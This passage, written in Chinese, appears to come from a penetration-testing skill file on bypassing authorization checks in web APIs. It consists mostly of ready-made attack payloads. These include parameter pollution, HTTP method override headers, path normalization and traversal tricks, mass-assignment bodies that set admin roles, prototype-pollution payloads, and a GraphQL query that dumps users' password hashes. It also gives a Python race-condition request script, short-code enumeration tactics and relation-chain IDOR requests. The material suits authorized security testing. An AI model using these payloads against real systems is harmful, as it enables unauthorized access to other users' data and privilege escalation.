## 三、绕过技术（高级）

### 3.1 多参数/参数污染
```http
GET /api/user?user_id=1&user_id=2     # HPP：不同框架取值不同
?userId=2&userid=2&USER_ID=2&User_id=2&uid=2   # 大小写变体
/api/user/profile?id=1 /api/user/1/profile /api/user;id=1
{"user_id": [1,2]} / {"id":"1,2"}     # 数组/逗号
```

### 3.2 HTTP方法覆盖
```http
GET /api/admin/users → 403
POST/PUT/PATCH/HEAD/OPTIONS → 逐一尝试
POST /api/user/123 HTTP/1.1
X-HTTP-Method-Override: PUT
_method=DELETE
```

### 3.3 Content-Type变换
```http
application/json → {"id":2}
application/x-www-form-urlencoded → id=2
application/xml → <id>2</id>
multipart/form-data → id=2
# 不同Content-Type可能走不同授权分支
```

### 3.4 路径/URL归一化绕过
```http
/api/users/123/ /./123 ///123 /123%00 /123.json /123;x=y
/api/v1/users/123 /v2/users/123   # 版本切换绕过
/api/users/123/../../admin        # 穿越
# 网关vs后端归一化差异（见api-security技能11.1）
```

### 3.5 Referer/Origin绕过
```http
Referer: https://target.com/admin/
Origin: https://target.com
X-Requested-With: XMLHttpRequest
```

### 3.6 批量分配（高级）
```http
POST /api/users
{"username":"hacker","password":"P@ss","is_admin":true,"role":"admin","is_staff":true}

# 原型污染辅助（Node.js框架）：
{"name":"x","__proto__":{"isAdmin":true}}
{"name":"x","constructor":{"prototype":{"role":"admin"}}}
# 嵌套对象绑定
{"user":{"name":"x","role":"admin"}}
# PATCH部分更新差异（auto-bind高发）
# 字段枚举：错误信息/文档/历史版本/对比正常字段
```

### 3.7 搜索/接口功能越权
```http
GET /api/search?q=&limit=10000       # 全量数据
GET /api/export?type=all&user_id=*   # 导出接口
GET /api/users?filter[role]=admin    # 过滤参数注入
GET /api/users?sort=email&page=1     # 分页爬取全量

# GraphQL introspection + IDOR
POST /graphql {"query":"{allUsers{id,email,passwordHash,role}}"}
```

### 3.8 竞态条件越权
```python
import threading
import requests

def req_user(user_cookie, target_id):
    r = requests.get(f'https://target.com/api/orders/{target_id}',
                     cookies={'session': user_cookie})
    print(r.text)

# 并发替换上下文/TOCTOU：权限检查后、操作前切换
# 支付/密码重置token竞态
# 用Turbo Intruder HTTP/2单包并发消除网络抖动
```

### 3.9 间接对象引用绕过（Indirect Reference）
```
# 应用用映射表/短码代替真实ID（如 /r/abc123 分享码）
# 攻击面：
# 1. 映射表ID可预测：短码=自增ID的Base62/缩短编码
#   → 解码Base62（10亿→Base62=6字符）可枚举
# 2. 短码随机性不足：时间戳+计数器 → 反推
# 3. 引用码不绑定用户：拿到他人分享码即越权
# 4. 映射表全局共享：同一短码不同用户可解析
# 5. 引用ID与真实ID互转：API同时接受两种ID → 转换绕过
# 工具：hashcat规则爆破短码、Python base62编解码

# 测试要点：
# - 比较引用码长度/字符集 → 判断编码算法
# - 收集多个引用码 → 分析递增规律
# - 尝试引用码直接替换对象ID参数
```

### 3.10 关系链IDOR（对象关系图遍历）
```
# 应用常暴露对象关联关系（/order/{id}/user），若只校验"直接对象"而未校验"关联对象"：
GET /api/orders/1001/owner/profile        # 从他人订单链到资料
GET /api/invoices/500/users/2/email       # 发票→用户
GET /api/teams/1/members/2/documents/3    # 多级嵌套
GET /api/groups/5/files/2/download        # 群组→文件
# 关系链本质：每个关联节点都可能漏授权检查
# 自动发现：抓取所有 /{obj}/{id}/{relation} 形式端点，逐级替换ID

# 批量/搜索接口绕过单对象检查：
POST /api/action {"id":[1,2,3]}           # 数组批量
POST /api/batch {"operations":[{"path":"/users/1"},{"path":"/users/2"}]}
# 深度：批量接口常绕过逐对象授权
```

